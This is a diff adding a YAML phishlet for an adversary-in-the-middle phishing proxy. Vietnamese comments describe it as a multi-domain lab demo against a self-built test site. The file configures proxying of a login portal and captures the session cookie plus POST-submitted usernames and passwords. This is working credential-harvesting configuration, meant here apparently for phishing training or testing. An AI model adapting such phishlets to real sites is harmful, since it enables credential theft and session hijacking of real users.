@@ -1,0 +1,21 @@
+# lab2.yaml — phishlet LAB domain THỨ HAI (multi-domain demo)
+# Origin vẫn là test site tự dựng (portal.lab2svc.test). Không nhắm dịch vụ thật.
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'portal', domain: 'lab2svc.test', session: true, is_landing: true, auto_filter: true}
+sub_filters: []
+auth_tokens:
+  - domain: 'portal.lab2svc.test'
+    keys: ['LABSESS']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'portal.lab2svc.test'
+  path: '/login'
